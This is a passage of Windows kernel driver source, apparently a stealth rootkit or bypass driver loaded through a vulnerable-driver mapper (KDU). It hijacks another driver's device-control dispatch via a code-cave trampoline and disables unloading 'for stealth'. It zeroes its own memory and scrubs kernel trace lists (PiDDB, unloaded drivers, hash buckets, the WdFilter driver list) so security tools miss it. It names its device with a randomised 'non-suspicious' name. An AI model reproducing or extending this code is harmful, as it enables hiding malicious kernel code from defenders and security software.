        // ---- Phase 3: Setup communication ----
        PDRIVER_OBJECT pDevOwner = FindSuitableHost();
        if (!pDevOwner) {
            LOG("[!] DriverEntry: no suitable host driver found\n");
            return STATUS_SUCCESS;
        }
        g_borrowedDrv = pDevOwner;

        // Install dispatch hook
        PDRIVER_DISPATCH dispFn = nullptr;

        if (newBase) {
            // After stomp: point dispatch into stomped image directly
            LONGLONG delta = (LONGLONG)((ULONG_PTR)newBase - (ULONG_PTR)selfBase);
            PDRIVER_DISPATCH stompedDispatch = (PDRIVER_DISPATCH)((PUCHAR)DispatchIoctl + delta);

            // Install cave in host driver pointing to stomped dispatch
            PLDR_DATA_TABLE_ENTRY hostLdr = (PLDR_DATA_TABLE_ENTRY)pDevOwner->DriverSection;
            if (hostLdr && hostLdr->DllBase) {
                PUCHAR cave = FindCodeCave(hostLdr->DllBase, 16);
                if (cave) {
                    PUCHAR result = WriteStubToCave(cave, (PVOID)stompedDispatch, 0xCC);
                    if (result) {
                        g_cavePtr = result;
                        g_drvStatus.CaveInstalled = 1;
                        g_drvStatus.CaveVA = (ULONGLONG)result;
                        dispFn = (PDRIVER_DISPATCH)result;
                    }
                }
            }
            if (!dispFn) dispFn = stompedDispatch;
        } else {
            // No stomp — use cave trampoline
            dispFn = InstallCaveTrampoline(ntBase, pDevOwner);
            if (!dispFn) dispFn = DispatchIoctl;
        }

        g_origDevCtrl = pDevOwner->MajorFunction[IRP_MJ_DEVICE_CONTROL];
        pDevOwner->MajorFunction[IRP_MJ_DEVICE_CONTROL] = dispFn;
        g_pDevice = pDevOwner->DeviceObject;

        // ---- Phase 4: Scrub original pool allocation ----
        if (newBase && selfBase) {
            PIMAGE_NT_HEADERS selfNt = RtlImageNtHeader(selfBase);
            if (selfNt) {
                g_drvStatus.PoolScrubbed = 1;

                // Sync final status to stomped image
                LONGLONG delta = (LONGLONG)((ULONG_PTR)newBase - (ULONG_PTR)selfBase);
                ULONG_PTR statusOff = (ULONG_PTR)&g_drvStatus - (ULONG_PTR)selfBase;
                WritePhysPage((PUCHAR)newBase + statusOff, &g_drvStatus, sizeof(BYPASS_STATUS));

                // Zero the pool — headers first, then all pages
                ULONG imageSize = selfNt->OptionalHeader.SizeOfImage;
                RtlZeroMemory(selfBase, min(imageSize, (ULONG)PAGE_SIZE));
            }
        }

        // ---- Phase 5: Deferred trace cleanup (runs after we're settled) ----
        if (ntBase) {
            g_cleanupWork.NtBase = ntBase;
            ExInitializeWorkItem(&g_cleanupWork.Item, DeferredCleanupCallback, &g_cleanupWork);
            ExQueueWorkItem(&g_cleanupWork.Item, DelayedWorkQueue);
        }

        LOG("[+] DriverEntry: KDU path complete — comm via host driver\n");
        return STATUS_SUCCESS;
    }

    // ---- Normal load path (with DriverObject) ----
    DriverObject->DriverUnload = nullptr;  // no unload for stealth

    if (ntBase) {
        UNICODE_STRING vehicleName = RTL_CONSTANT_STRING(VEHICLE_DRIVER_NAME);
        ClearPiDDBEntryByName(ntBase, &vehicleName);
        ClearUnloadedEntryByName(ntBase, &vehicleName);
        ClearKernelHashBucketList(ntBase);
        ClearWdFilterDriverList(ntBase);
        InstallWalkChainHook(ntBase);
    }

    g_origDevCtrl = DriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL];
    PDRIVER_DISPATCH dispFn = InstallCaveTrampoline(ntBase, DriverObject);
    if (!dispFn) dispFn = DispatchIoctl;
    DriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = dispFn;

    // Create device using host's existing device for the KDU path
    // For normal load, create our own device with non-suspicious name
    WCHAR devNameBuf[64] = {};
    LARGE_INTEGER tsc;
    KeQueryTickCount(&tsc);
    ULONG nameSeed = (ULONG)(tsc.QuadPart ^ kBuildSeed);
    swprintf(devNameBuf, ARRAYSIZE(devNameBuf), L"\\Device\\Nsi%08X", nameSeed);

    UNICODE_STRING devName;
    RtlInitUnicodeString(&devName, devNameBuf);

    NTSTATUS status = IoCreateDevice(DriverObject, 0, &devName,
                                     FILE_DEVICE_NETWORK, 0, FALSE, &g_pDevice);
    if (!NT_SUCCESS(status)) {
        DriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = g_origDevCtrl;
        ZeroCave();
        return status;
    }
    g_pDevice->Flags |= DO_BUFFERED_IO;
    g_pDevice->Flags &= ~DO_DEVICE_INITIALIZING;

    // Create symlink for usermode access
    WCHAR lnkNameBuf[64] = {};
    swprintf(lnkNameBuf, ARRAYSIZE(lnkNameBuf), L"\\DosDevices\\Nsi%08X", nameSeed);
    UNICODE_STRING lnkName;
    RtlInitUnicodeString(&lnkName, lnkNameBuf);

    status = IoCreateSymbolicLink(&lnkName, &devName);
    if (!NT_SUCCESS(status)) {
        IoDeleteDevice(g_pDevice);
        g_pDevice = nullptr;
        DriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = g_origDevCtrl;
        ZeroCave();
        return status;
    }

    return STATUS_SUCCESS;
}
